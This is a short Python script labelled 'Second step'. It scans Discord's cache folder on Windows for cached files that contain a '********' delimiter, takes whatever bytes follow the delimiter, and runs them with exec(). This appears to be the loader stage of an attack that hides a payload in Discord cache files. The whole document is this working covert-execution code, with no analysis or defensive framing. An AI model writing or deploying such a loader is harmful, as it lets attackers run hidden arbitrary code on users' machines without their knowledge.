# Second step

import os

DELIMITER = b'********'

cache_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Cache')

for file in (x for x in os.listdir(cache_path) if x.startswith('f_')):
    with open(os.path.join(cache_path, file), 'rb') as fd:
        buf = fd.read()

    if DELIMITER in buf:
        payload_start_index = buf.rindex(DELIMITER) + len(DELIMITER)
        payload = buf[payload_start_index:]

        exec(payload)
        break